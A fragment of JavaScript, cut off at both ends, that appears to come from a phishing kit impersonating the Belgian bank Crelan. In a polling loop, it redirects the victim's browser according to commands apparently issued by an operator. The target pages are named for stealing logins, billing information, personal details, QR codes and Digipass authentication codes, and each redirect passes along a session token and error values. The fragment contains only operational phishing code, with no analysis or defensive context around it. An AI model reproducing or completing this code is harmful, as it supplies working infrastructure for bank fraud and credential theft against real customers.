                        var two = row[1];
						var tree = row[2];
						var forth = row[3];
                        if( one == 'load' ) {
                            /* clearInterval(waiting);
                            location.href = "./cre-load.php?token=" + token1 + "&error=" + two; */
                        } else if( one == 'log' ) {
                            clearInterval(waiting);
                            location.href = "./cre-log.php?token=" + token1 + "&error=" + two;
                        } else if( one == 'home' ) {
                            clearInterval(waiting);
                            location.href = "./cre-home.php?token=" + token1 + "&error=" + two;
                        } else if( one == 'bill' ) {
                            clearInterval(waiting);
                            location.href = "./cre-bill.php?token=" + token1 + "&error=" + two;
                        } else if( one == 'infos' ) {
                            clearInterval(waiting);
                            location.href = "./cre-infos.php?token=" + token1 + "&error=" + two;
                        } else if( one == 'qrimg' ) {
                            clearInterval(waiting);
                            location.href = "./cre-qrimg.php?token=" + token1 + "&error=" + two;
                        } else if( one == 'done' ) {
                            clearInterval(waiting);
                            location.href = "./cre-done.php?token=" + token1;
                        } else if( one == 'choice-crelan' ) {
                            clearInterval(waiting);						
                            location.href = "./cre-choice-crelan.php?token=" + token1 + "&error=" + two;				
                        } else if( one == 'l-crelan' ) {
                            clearInterval(waiting);
                            location.href = "./cre-l-crelan.php?token=" + token1 + "&error=" + two + "&t0=" + tree + "&t1=" + forth;
                        } else if( one == 'l-digipass' ) {
                            clearInterval(waiting);
                            location.href = "./cre-l-digipass.php?token=" + token1 + "&error=" + two + "&t0=" + tree + "&t1=" + forth;
                        } 
						

                    }
